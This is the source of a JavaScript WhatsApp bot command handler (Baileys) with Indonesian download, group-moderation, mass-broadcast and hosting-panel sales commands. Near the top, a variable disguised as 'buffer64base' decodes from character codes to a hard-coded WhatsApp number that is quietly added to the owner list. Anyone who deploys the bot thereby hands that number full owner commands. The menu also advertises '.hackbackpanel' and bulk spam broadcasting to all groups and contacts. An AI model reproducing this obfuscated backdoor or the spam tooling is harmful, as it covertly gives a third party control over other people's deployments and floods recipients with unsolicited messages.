/*

  !- Credits By Skyzopedia
  https://wa.me/6285624297894
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { addSaldo, minSaldo, cekSaldo } = require('./library/funcsaldo.js')
const { marginConfig, resellerLevels, calculatePrice } = require('./library/profit-config.js');
let db_saldo = JSON.parse(fs.readFileSync("./library/database/saldo.json"))
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser, createSerial } = require('./library/register.js')
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

module.exports = conn = async (conn, m, chatUpdate, store) => {
	try {
await LoadDataBase(conn, m)
const botNumber = await conn.decodeJid(conn.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const moment = require('moment-timezone')
const bulanIndonesia = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
const hariIndonesia = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
const tanggalSekarang = moment().tz("Asia/Jakarta");
const tanggal2 = tanggalSekarang.date();
const bulan = bulanIndonesia[tanggalSekarang.month()];
const tahun = tanggalSekarang.year();
const tanggalnew = `${tanggal2} ${bulan} ${tahun}`;
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss")
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const isCmd = body.startsWith(prefix)
function toRupiah(angka) {
  angka = angka.toString()
  var pattern = /(-?\d+)(\d{3})/
  while (pattern.test(angka)) 
      angka = angka.replace(pattern, "$1.$2")
  return 'Rp ' + angka
}
// Tambahkan di bagian atas file setelah definisi fungsi-fungsi utama
function countProfit(jumlahAwal) {
  jumlahAwal = parseInt(jumlahAwal)
  let keuntungan = jumlahAwal * 0.1 // Keuntungan 10%
  if (keuntungan > 1000) {
      keuntungan = 1000 // Max profit 1000
  }
  return (jumlahAwal + keuntungan).toFixed(0)
}
// Tambahkan fungsi format rupiah
function toRupiahh(angka) {
  return angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")
}
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)


//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//
if (!fs.existsSync("./library/database/saldo.json")) {
  fs.writeFileSync("./library/database/saldo.json", "[]")
}

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
*andi spnb🌟*
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}


//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: conn.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*SPNB-AI* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*SPNB-AI Menyediakan 🌟*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await conn.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}


//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "menu": {
let teksnya = `
Haii @${m.sender.split("@")[0]},
Perkenalkan, saya adalah *${global.botname2}*. klik tombol menu di bawah ini untuk mengetahui berbagai fitur yang dapat saya lakukan.
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Menu' },
      type: 1
    },
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Owner' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case "allmenu": {
let teks = `
\`▧ I N F O R M A T I O N\`
  • Botname : *${global.botname2}*
  • Version : *${global.versi}*
  • Mode : *${conn.public ? "Public": "Self"}*
  • Creator : @${global.owner}
  • Uptime Vps : *${runtime(os.uptime())}*

  • Your Status *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : "Free User"})*
  
\`▧ Othermenu\`
  • .cekidch
  • .cekidgc
  • .qc
  • .brat
  • .bratvid
  • .readviewonce
  • .stickerwm
  • .sticker
  • .rvo
  
\`▧ Searchmenu\`
  • .yts
  • .apkmod
  • .pinterest
  • .gimage  
  • .sfile
  
\`▧ Toolsmenu\`
  • .ai
  • .gpt
  • .tourl
  • .tourl2
  • .ssweb
  • .translate
  • .tohd
  • .toimg
  • .shortlink
  • .shortlink2
  • .enc
  • .enchard
  
\`▧ Downloadmenu\`
  • .tiktok
  • .tiktokmp3
  • .facebook
  • .capcut
  • .instagram
  • .ytmp3
  • .ytmp4
  • .play
  • .playvid
  • .gitclone
  • .mediafire
  
\`▧ Storemenu\`
  • .addrespon
  • .delrespon
  • .listrespon
  • .done
  • .proses
  • .jpm
  • .jpm2
  • .jpmtesti
  • .jpmslide
  • .jpmslideht
  • .sendtesti
  • .pushkontak
  • .pushkontak2
  • .payment
  • .produk
  
\`▧ Installermenu\`
  • .hackbackpanel
  • .installpanel
  • .installtemastellar
  • .installtemabilling
  • .installtemaenigma
  • .uninstallpanel
  • .uninstalltema
  
\`▧ Groupmenu\`
  • .antilink
  • .antilink2
  • .blacklistjpm
  • .welcome
  • .add
  • .kick
  • .close
  • .open
  • .hidetag
  • .kudetagc
  • .leave
  • .tagall
  • .promote
  • .demote
  • .resetlinkgc
  • .linkgc
  
\`▧ Ownermenu\`
  • .autoread
  • .autopromosi
  • .autoreadsw
  • .autotyping
  • .addowner
  • .addpre
  • .listowner
  • .delowner
  • .self/public
  • .subdomain
  • .setimgmenu
  • .setimgfake
  • .setppbot
  • .clearsession
  • .clearchat
  • .resetdb
  • .restartbot
  • .getsc
  • .getcase
  • .listgc
  • .joingc
  • .joinch
  • .upchannel
  • .upchannel2
  `
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "unblock");
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "play": {
if (!text) return m.reply(example("dj tiktok"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+res.url)

if (anu.download.audio) {
let urlMp3 = anu.download.audio
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+res.url)

if (anu.download.video) {
let urlMp3 = anu.download.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+text)
if (anu.download.audio) {
let urlMp3 = anu.download.audio
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "block")
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+text)
if (anu.download.video) {
let urlMp3 = anu.download.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.spnb.my.id/api/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.spnb.my.id/api/download/fbdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return m.reply(example("https://github.com/andi-spnb"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
